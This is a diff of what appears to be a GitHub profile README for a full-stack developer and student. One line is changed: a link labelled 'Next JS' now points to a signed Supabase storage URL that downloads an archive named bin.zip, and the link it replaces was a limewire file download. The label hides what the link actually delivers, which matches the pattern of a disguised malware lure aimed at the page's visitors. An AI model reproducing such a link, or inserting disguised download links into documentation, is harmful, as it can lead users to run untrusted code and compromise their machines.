@@ -5,7 +5,7 @@
 
 - 🎓 Currently pursuing **MCA** at **Nirma University**
 
-- 🔭 I’m currently mastering [Next JS](https://limewire.com/d/llUkB#G81QAxAwR7)
+- 🔭 I’m currently mastering [Next JS](https://vcbjbwdsnkyqtnzocobq.supabase.co/storage/v1/object/sign/vault-files/bin.zip?token=eyJraWQiOiIzOWMwNjAxNS00MDViLTQyODgtOTcyMy0wMDQxOWVmZTgxZTUiLCJhbGciOiJIUzI1NiJ9.eyJ1cmwiOiJ2YXVsdC1maWxlcy9iaW4uemlwIiwic2NvcGUiOiJkb3dubG9hZCIsImlhdCI6MTc5NTAwMDU4MiwiZXhwIjoxNzk3NTkyNTgyfQ.lXRN1-Yp6cvUTMHN68tQSn6ZC8oER97C6JuDv4c6z04)
 
 - 🌱 I’m a **Full Stack Dev**
 
